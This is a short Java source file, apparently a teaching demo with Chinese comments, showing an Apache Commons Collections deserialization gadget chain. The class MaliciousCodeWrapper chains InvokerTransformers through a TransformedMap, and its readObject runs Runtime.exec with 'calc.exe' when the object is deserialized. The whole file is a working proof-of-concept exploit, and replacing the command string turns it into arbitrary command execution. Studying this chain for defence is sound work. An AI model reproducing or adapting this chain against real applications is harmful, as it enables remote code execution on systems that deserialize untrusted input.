package com.example.demo;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class Serialization {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        String command = "calc.exe";
        MaliciousCodeWrapper maliciousCodeWrapper = new MaliciousCodeWrapper(command);
        // serialize
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(bout);
        objectOutputStream.writeObject(maliciousCodeWrapper);
        byte[] data = bout.toByteArray();
        // deserialize
        ByteArrayInputStream bin = new ByteArrayInputStream(data);
        ObjectInputStream objectInputStream = new ObjectInputStream(bin);
        MaliciousCodeWrapper object = (MaliciousCodeWrapper) objectInputStream.readObject();
    }
}

class MaliciousCodeWrapper implements Serializable {
    private static final long serialVersionUID = -4238334997122903591L;
    private Map transformedMap;

    MaliciousCodeWrapper(String command) {
        // 相当与((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec(command);
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{command})
        };
        Transformer transformer = new ChainedTransformer(transformers);
        // 用transformedMap包装Map对象
        // TransformedMap在Entry进行改变的时候对该Key和Value进行Transformer提供的转换操作
        Map<Object, Object> map = new HashMap<>();
        map.put("k", "v");
        transformedMap = TransformedMap.decorate(map, transformer, transformer);
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Map.Entry entry = (Map.Entry) this.transformedMap.entrySet().iterator().next();
        // 调用setValue方法才会执行TransfromedMap的代码
        entry.setValue("newValue");
    }
}
